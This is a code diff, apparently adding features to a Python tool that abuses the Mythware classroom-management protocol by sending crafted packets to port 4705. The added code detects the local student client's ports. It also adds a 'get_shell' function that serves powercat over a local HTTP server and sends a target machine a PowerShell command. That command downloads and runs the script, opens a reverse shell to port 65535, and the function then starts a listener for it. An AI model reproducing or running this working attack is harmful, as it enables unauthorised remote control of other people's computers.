@@ -2,6 +2,9 @@ import datetime
 import socket
 from struct import pack
 from time import sleep
+from subprocess import Popen, PIPE
+from re import compile
+import os
 
 store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7, 0x52, 0x40, 0x91,
           0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
@@ -121,3 +124,140 @@ def send(send_list,ip,l=1,p=4705,t=22):
             logger("第%s次执行完毕" % str(times + 1))
             if times != l - 1:
                 sleep(t)
+
+
+# 自动检测极域学生端端口
+def find_student_ports():
+    """检测本机极域学生端使用的端口"""
+    try:
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        logger("你的IP:" + ip)
+
+        tasklist = Popen("tasklist|find \"Student\"", stdout=PIPE, shell=True).communicate()[0].decode()
+        pattern = compile(r'[e]\s*\d{1,5}\s*[C]')
+        match = pattern.search(tasklist)
+        if not match:
+            logger("未找到极域进程")
+            return []
+
+        pid = (match.group()[1:-1]).strip()
+        netstat = Popen("netstat -ano |find \"{}\"".format(pid), stdout=PIPE, shell=True).communicate()[0].decode()
+        pattern = compile(r"%s:\d{1,5}\s*[*]{1}" % ip)
+        netstat_pat = pattern.findall(netstat)
+
+        ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
+        logger("检测到的端口有:" + ','.join(ports))
+        return ports
+    except Exception as e:
+        logger("端口检测失败: " + str(e))
+        return []
+
+def prepare_powercat():
+    """检查并准备 p.ps1 到当前工作目录（支持 PyInstaller 打包）"""
+    import sys
+    import os
+    import shutil
+
+    # 获取程序运行目录（兼容打包）
+    if getattr(sys, 'frozen', False):
+        base_dir = sys._MEIPASS
+    else:
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+
+    src_file = os.path.join(base_dir, "p.ps1")
+    dst_file = os.path.join(os.getcwd(), "p.ps1")
+
+    if os.path.exists(dst_file):
+        logger("[+] 当前目录已存在 p.ps1")
+        return True
+
+    if os.path.exists(src_file):
+        try:
+            shutil.copy2(src_file, dst_file)
+            logger("[+] 已从打包目录复制 p.ps1 到当前目录")
+            return True
+        except Exception as e:
+            logger("[-] 复制 p.ps1 失败: " + str(e))
+            return False
+    else:
+        logger("[-] 未找到 p.ps1，请确保该文件在程序目录或打包资源中")
+        return False
+# 反弹shell
+def get_shell(target_ip, local_ip=None):
+    # 【新增】切换到 exe 所在目录（打包后确保 HTTP 能访问 p.ps1）
+    import sys
+    if getattr(sys, 'frozen', False):
+        os.chdir(os.path.dirname(sys.executable))
+    """
+    向目标发送反弹shell命令
+    自动准备 p.ps1，启动 HTTP 服务器，并启动本地监听器
+    """
+    if local_ip is None:
+        try:
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+        except:
+            logger("[-] 无法自动获取本地IP，请手动指定")
+            return
+
+    logger("[*] 目标IP: " + target_ip)
+    logger("[*] 本地IP: " + local_ip)
+
+    # 1. 准备 p.ps1 文件
+    if not prepare_powercat():
+        logger("[-] p.ps1 准备失败，反弹shell中止")
+        return
+
+    # 2. 启动 HTTP 服务器（在后台新窗口运行，提供 p.ps1 下载）
+    try:
+        # 检测 8000 端口是否已被占用，简单尝试启动，若失败则提示手动启动
+        import subprocess
+        # 在 Windows 下用新窗口启动简易 HTTP 服务器
+        subprocess.Popen(
+            ["python", "-m", "http.server", "8000"],
+            creationflags=subprocess.CREATE_NEW_CONSOLE,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        logger("[+] HTTP 服务器已启动 (端口 8000)，请确保防火墙允许入站")
+    except Exception as e:
+        logger("[!] 自动启动 HTTP 服务器失败: " + str(e))
+        logger("[!] 请手动在命令行执行: python -m http.server 8000")
+
+    # 3. 构造反弹shell命令
+    url = "http://{}:8000/p.ps1".format(local_ip)
+    # 注意：powercat 加载后执行反向连接
+    cmd = (
+        "powershell -c "
+        "IEX (New-Object Net.WebClient).DownloadString('{}'); "
+        "powercat -c {} -p 65535 -e powershell"
+    ).format(url, local_ip)
+
+    logger("[*] 命令长度: " + str(len(cmd)) + " 字符")
+    logger("[*] 正在向目标发送反弹shell命令...")
+
+    # 4. 发送命令
+    send_list = pkg_sendlist('-c', cmd)
+    send([send_list], target_ip, l=1, p=4705, t=1)
+
+    # 5. 启动本地监听器（新窗口）
+    try:
+        listener_cmd = (
+            "powershell -c "
+            "IEX (New-Object Net.WebClient).DownloadString('http://{}:8000/p.ps1'); "
+            "powercat -l -p 65535"
+        ).format(local_ip)
+
+        subprocess.Popen(
+            listener_cmd,
+            creationflags=subprocess.CREATE_NEW_CONSOLE,
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        logger("[+] 本地监听器已启动 (端口 65535)，请查看新弹出的 PowerShell 窗口")
+        logger("[*] 若目标成功执行，监听器窗口将收到反弹 shell")
+    except Exception as e:
+        logger("[!] 启动监听器失败: " + str(e))
+        logger("[!] 请手动执行: powercat -l -p 65535")
